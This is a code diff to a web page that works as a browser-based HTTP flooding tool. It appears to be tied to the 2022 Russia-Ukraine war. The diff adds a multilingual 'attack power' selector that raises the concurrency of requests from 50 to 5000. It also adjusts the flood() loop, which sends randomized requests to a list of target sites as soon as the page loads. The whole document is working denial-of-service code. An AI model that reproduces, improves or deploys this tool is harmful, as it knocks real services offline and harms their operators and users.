@@ -52,6 +52,18 @@ header("Pragma: no-cache")
                 відкритим. 🙏</p>
         </td>
     </tr>
+    <tr>
+        <td colspan="4">Síla útoku | Attack power | Сила атаки | Сила атаки</td>
+    </tr>
+    <tr>
+        <td colspan="4">
+            <input type="radio" name="power" id="low" /><label for="low">Slabí | Low | низкий | низький</label><br />
+            <input type="radio" name="power" id="middle" checked="checked" /><label for="middle">Střední | Middle | Середина | Середній</label><br />
+            <input type="radio" name="power" id="high" /><label for="high">Silný | High | Сильный | Сильний</label><br />
+            <input type="radio" name="power" id="full" /><label for="full">Nejsilnější | Full | Полный | Повний</label><br />
+            <input type="radio" name="power" id="extreme" /><label for="extreme">Extrémní | Extreme | Экстрим | Екстремальний</label><br />
+        </td>
+    </tr>
 </table>
 <p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine conflict: Russian forces
         attack from three sides</a></p>
@@ -131,7 +143,9 @@ header("Pragma: no-cache")
     async function flood(target) {
         for (var i = 0; ; ++i) {
             if (queue.length > CONCURRENCY_LIMIT) {
-                await queue.shift()
+                for (var j = 0; queue.length > CONCURRENCY_LIMIT+1; j++) {
+                    await queue.shift()
+                }
             }
             rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
             queue.push(
@@ -174,5 +188,34 @@ header("Pragma: no-cache")
 
     // Start
     var destinations = shuffle(Object.keys(targets))
-    destinations.map(flood)
+     destinations.map(flood)
+
+    var element = document.getElementsByName('power')
+    for (var i=element.length; i--;) {
+        element[i].addEventListener('click', changePower, false)
+    }
+
+    function changePower() {
+        console.log('Changing power to ' + this.id + '.')
+        switch (this.id) {
+            case 'low':
+                CONCURRENCY_LIMIT = 50
+                break;
+            case 'middle':
+                CONCURRENCY_LIMIT = 300
+                break;
+            case 'high':
+                CONCURRENCY_LIMIT = 800
+                break;
+            case 'full':
+                CONCURRENCY_LIMIT = 1600
+                break;
+            case 'extreme':
+                CONCURRENCY_LIMIT = 5000
+                break;
+        }
+        console.log('Power changed to ' + CONCURRENCY_LIMIT + ' concurrence requests.')
+    }
+
+
 </script>
